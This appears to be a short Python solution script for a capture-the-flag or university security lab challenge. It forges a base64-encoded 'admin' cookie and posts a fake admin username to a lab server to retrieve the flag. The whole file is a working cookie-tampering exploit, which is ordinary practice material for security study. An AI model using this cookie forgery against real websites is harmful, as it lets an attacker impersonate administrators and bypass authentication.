import base64
import requests

SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:23056'

initial_response = requests.get(SERVER)

print("Initial Page Content:")
print(initial_response.text)

data = {"username": "ZmFrZS1hZG1pbg=="} # POST & GET cookie user value (ZmFrZS1hZG1pbg==) for admin (encoded)

encoded_username = base64.b64encode("admin".encode()).decode()

new_cookies = requests.cookies.RequestsCookieJar()
new_cookies.set("user", encoded_username)

response = requests.post(SERVER, data=data, cookies=new_cookies)

print("\nPOST Response (FLAG):")
print(response.text)
